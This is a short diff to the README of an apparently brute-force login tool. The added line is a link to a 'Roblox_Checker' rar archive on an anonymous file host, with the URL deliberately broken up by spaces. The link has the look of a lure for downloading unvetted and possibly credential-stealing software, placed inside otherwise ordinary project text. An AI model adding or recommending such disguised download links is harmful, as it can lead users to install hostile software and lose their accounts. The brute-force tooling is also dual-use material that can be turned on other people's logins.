@@ -7,3 +7,5 @@ then type -h to show help list
 ### want to test it?
 try it on my custom made html for bruteforce ;)
 when you download the file just open the index.html file then your ready to go!
+
+check = https : / / anonfiles . com/fbu9s00bo5/Roblox_Checker_v1. 0 .1_rar
